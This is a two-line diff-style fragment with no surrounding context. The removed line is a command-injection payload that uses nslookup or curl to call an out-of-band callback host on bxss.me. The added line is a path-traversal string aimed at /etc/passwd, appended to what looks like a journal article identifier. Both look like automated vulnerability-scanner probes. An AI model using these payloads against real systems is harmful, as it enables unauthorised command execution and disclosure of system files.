@@ -1,1 +1,1 @@
-$(nslookup -q=cname hitlshyvndtsm254b2.bxss.me||curl hitlshyvndtsm254b2.bxss.me)
+../../../../../../../../../../etc/passwd.1088/0953-8984/16/27/003
